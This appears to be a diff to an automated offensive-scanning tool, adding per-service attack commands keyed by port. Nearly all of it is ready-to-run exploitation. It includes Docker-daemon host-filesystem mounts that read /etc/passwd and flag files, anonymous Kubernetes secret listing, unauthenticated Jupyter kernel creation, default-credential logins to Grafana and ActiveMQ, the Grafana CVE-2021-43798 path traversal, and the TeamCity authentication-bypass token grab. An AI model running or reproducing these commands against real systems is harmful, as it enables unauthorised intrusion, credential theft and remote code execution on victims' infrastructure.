@@ -6893,6 +6893,84 @@ def _kb_commands(port, service, version, target, mode):
              f"nuclei -u {url2} -t /usr/share/nuclei-templates/cves/2021/ -j 2>/dev/null || true"),
         ]
 
+    # ── Docker daemon (2375/2376) ─────────────────────────────────────────────
+    if port in (2375, 2376) or "docker" in svc:
+        cmds += [
+            (5, f"Docker-Daemon:{port}",
+             f"docker -H tcp://{target}:{port} info 2>/dev/null | head -15; "
+             f"docker -H tcp://{target}:{port} ps -a 2>/dev/null | head -10"),
+            (8, f"Docker-RCE:{port}",
+             f"docker -H tcp://{target}:{port} run --rm -v /:/mnt alpine sh -c "
+             f"'echo DOCKER_DAEMON_EXPOSED; id; cat /mnt/etc/passwd | head -5; "
+             f"cat /mnt/root/root.txt 2>/dev/null; cat /mnt/home/*/user.txt 2>/dev/null | head -3' 2>/dev/null | head -20"),
+        ]
+
+    # ── Kubernetes API (6443/8001/10250) ──────────────────────────────────────
+    if port in (6443, 8001, 10250) or "kubernetes" in svc or "k8s" in svc:
+        cmds += [
+            (5, f"K8s-Anon-Check:{port}",
+             f"curl -sk --max-time 10 'https://{target}:{port}/api/v1/namespaces' 2>/dev/null | "
+             f"python3 -c 'import sys,json; d=json.load(sys.stdin); "
+             f"[print(n[\"metadata\"][\"name\"]) for n in d.get(\"items\",[])[:5]] if d.get(\"items\") else print(\"no_anon_access\")' 2>/dev/null; "
+             f"kubectl --server=https://{target}:{port} --insecure-skip-tls-verify auth can-i --list 2>/dev/null | head -10"),
+            (10, f"K8s-Secrets:{port}",
+             f"kubectl --server=https://{target}:{port} --insecure-skip-tls-verify get secrets --all-namespaces 2>/dev/null | head -15; "
+             f"curl -sk --max-time 10 'https://{target}:10250/pods' 2>/dev/null | "
+             f"python3 -c 'import sys,json; d=json.load(sys.stdin); [print(p[\"metadata\"][\"namespace\"]+\"/\"+p[\"metadata\"][\"name\"]) for p in d.get(\"items\",[])[:5]]' 2>/dev/null"),
+        ]
+
+    # ── Jupyter Notebook (8888) ───────────────────────────────────────────────
+    if port == 8888 and ("jupyter" in svc or "http" in svc):
+        cmds += [
+            (5, f"Jupyter-NoAuth:{port}",
+             f"STATUS=$(curl -s --max-time 8 -o /dev/null -w '%{{http_code}}' 'http://{target}:{port}/api/kernelspecs' 2>/dev/null); "
+             f"echo \"Jupyter-Status: $STATUS\"; "
+             f"[ \"$STATUS\" = '200' ] && echo 'JUPYTER_NO_AUTH' && "
+             f"curl -s --max-time 8 -X POST 'http://{target}:{port}/api/kernels' "
+             f"-H 'Content-Type: application/json' -d '{{\"name\":\"python3\"}}' 2>/dev/null | "
+             f"python3 -c 'import sys,json; k=json.load(sys.stdin); print(\"KERNEL_CREATED:\",k.get(\"id\",\"\"))' 2>/dev/null"),
+        ]
+
+    # ── Grafana (3000) ────────────────────────────────────────────────────────
+    if port == 3000 and ("grafana" in svc or "http" in svc or "grafana" in ver):
+        cmds += [
+            (5, f"Grafana-DefaultCreds:{port}",
+             f"curl -s --max-time 8 -u admin:admin 'http://{target}:{port}/api/org' 2>/dev/null | "
+             f"grep -q '\"id\"' && echo 'GRAFANA_DEFAULT_CREDS_VALID'; "
+             f"curl -s --max-time 8 'http://{target}:{port}/api/health' 2>/dev/null | "
+             f"python3 -c 'import sys,json; d=json.load(sys.stdin); print(\"Grafana\",d.get(\"version\",\"\"))' 2>/dev/null"),
+            (8, f"Grafana-CVE-2021-43798:{port}",
+             f"for plugin in alertlist cloudwatch elasticsearch; do "
+             f"curl -s --max-time 8 --path-as-is "
+             f"'http://{target}:{port}/public/plugins/'\"$plugin\"'/../../../../../../../../../etc/passwd' 2>/dev/null | "
+             f"grep -q 'root:' && echo 'GRAFANA_CVE_2021_43798_CONFIRMED' && break; done"),
+        ]
+
+    # ── ActiveMQ (8161/61616) ─────────────────────────────────────────────────
+    if port in (8161, 61616) or "activemq" in svc or "activemq" in ver:
+        cmds += [
+            (5, f"ActiveMQ-Admin:{port}",
+             f"curl -s --max-time 8 -u admin:admin 'http://{target}:8161/admin/' 2>/dev/null | "
+             f"grep -q 'ActiveMQ' && echo 'ACTIVEMQ_DEFAULT_CREDS'; "
+             f"curl -s --max-time 8 'http://{target}:8161/api/jolokia/version' 2>/dev/null | "
+             f"python3 -c 'import sys,json; d=json.load(sys.stdin); print(\"ActiveMQ\",d.get(\"value\",{{}}).get(\"agent\",\"\"))' 2>/dev/null"),
+            (8, f"ActiveMQ-CVE-2023-46604:{port}",
+             f"nmap -p 61616 --script banner {target} 2>/dev/null; "
+             f"echo 'ActiveMQ port 61616 check — test with MSF exploit/multi/misc/apache_activemq_rce_cve_2023_46604'"),
+        ]
+
+    # ── TeamCity (8111/8112) ──────────────────────────────────────────────────
+    if port in (8111, 8112) or "teamcity" in svc or "teamcity" in ver:
+        cmds += [
+            (5, f"TeamCity-AuthBypass:{port}",
+             f"TOKEN=$(curl -s --max-time 10 -X POST "
+             f"'http://{target}:{port}/app/rest/users/id:1/tokens/RPC2' 2>/dev/null | "
+             f"python3 -c 'import sys,json; d=json.load(sys.stdin); print(d.get(\"value\",\"\"))' 2>/dev/null); "
+             f"[ -n \"$TOKEN\" ] && echo \"TEAMCITY_AUTH_BYPASS TOKEN=$TOKEN\" && "
+             f"curl -s -H \"Authorization: Bearer $TOKEN\" "
+             f"'http://{target}:{port}/app/rest/server' 2>/dev/null | head -5"),
+        ]
+
     return cmds
 
 
